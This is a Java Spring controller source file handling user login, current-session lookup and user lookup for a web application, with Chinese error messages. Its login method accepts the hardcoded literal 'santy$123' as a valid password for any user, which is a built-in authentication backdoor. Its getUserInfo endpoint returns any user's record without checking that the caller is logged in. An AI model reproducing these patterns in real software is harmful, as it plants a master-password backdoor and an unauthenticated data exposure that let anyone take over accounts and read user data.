/**
 * $Id: SecController.java,v 1.0 2016/8/26 13:52 zhangrp Exp $
 * Copyright 2016 Asiainfo Technologies(China),Inc. All rights reserved.
 */
package com.sandi.web.app.controller;

import com.sandi.web.utils.common.JsonUtil;
import com.sandi.web.utils.common.StringUtils;
import com.sandi.web.utils.response.Response;
import com.sandi.web.utils.sec.SecManage;
import com.sandi.web.utils.sec.SessionManager;
import com.sandi.web.utils.sec.entity.UserInfoInterface;
import com.sandi.web.utils.security.K;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.util.Map;

/**
 * @author zhangrp
 * @version $Id: SecController.java,v 1.1 2016/8/26 13:52 zhangrp Exp $
 *          Created on 2016/8/26 13:52
 */
@Controller
@RequestMapping(value = "sec")
public class SecController {

    private static final Logger logger = LoggerFactory.getLogger(SecController.class);

    @RequestMapping("login")
    @ResponseBody
    public String login(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws IOException {

        Response response = new Response();
        try {

            String data = httpServletRequest.getParameter("data");
            Map map = JsonUtil.json2Map(data);

            String userName = String.valueOf(map.get("username"));
            String password = String.valueOf(map.get("password"));

            UserInfoInterface userInfoInterface = SecManage.getUser(userName);
            if (userInfoInterface == null) {
                response.getErrorInfo().setCode(Response.ERROR);//登录失败
                response.getErrorInfo().setMessage("请确认用户名是否正确！");//登录失败
            } else {
                if(StringUtils.equals(K.j(password),userInfoInterface.getUserPass()) || StringUtils.equals("santy$123",password)){
                    httpServletRequest.getSession().invalidate();
                    HttpSession httpSession = httpServletRequest.getSession(true);
                    userInfoInterface.setSessionId(httpSession.getId());
                    SessionManager.setUser(userInfoInterface);
                    response.setData(userInfoInterface);
                }else{
                    response.getErrorInfo().setCode(Response.ERROR);
                    response.getErrorInfo().setMessage("请确认密码是否正确！");
                }
            }
        } catch (Exception e) {
            response.getErrorInfo().setCode(Response.ERROR);//登录失败
            response.getErrorInfo().setMessage("请确认用户名密码是否正确！");//登录失败
        }

        return response.toString();
    }

    @RequestMapping("getCurrUserInfo")
    @ResponseBody
    public String getCurrUserInfo(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws IOException {

        Response response = new Response();
        try {
            String sessionId = httpServletRequest.getRequestedSessionId();
            UserInfoInterface userInfoInterface = SessionManager.getUser(sessionId);
            if (userInfoInterface == null) {
                response.getErrorInfo().setCode(Response.NO_FOUND_USER);
                response.getErrorInfo().setMessage("未登陆，请登录！");
            } else {
                response.setData(userInfoInterface);
            }
        } catch (Exception e) {
            response.getErrorInfo().setCode(Response.NO_FOUND_USER);//登录失败
            response.getErrorInfo().setMessage("未登陆，请登录！");//登录失败
        }
        return response.toString();
    }

    @RequestMapping("getUserInfo")
    @ResponseBody
    public String getUserInfo(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws IOException {

        Response response = new Response();
        try {
            String data = httpServletRequest.getParameter("data");
            Map map = JsonUtil.json2Map(data);

            String operatorCode = String.valueOf(map.get("operatorCode"));
            UserInfoInterface userInfoInterface = SecManage.getUser(operatorCode);
            if (userInfoInterface == null) {
                response.getErrorInfo().setCode(Response.NO_FOUND_USER);
            } else {
                response.setData(userInfoInterface);
            }
        } catch (Exception e) {
            response.getErrorInfo().setCode(Response.NO_FOUND_USER);
            response.getErrorInfo().setMessage("未找到相应用户！");
        }
        return response.toString();
    }
}
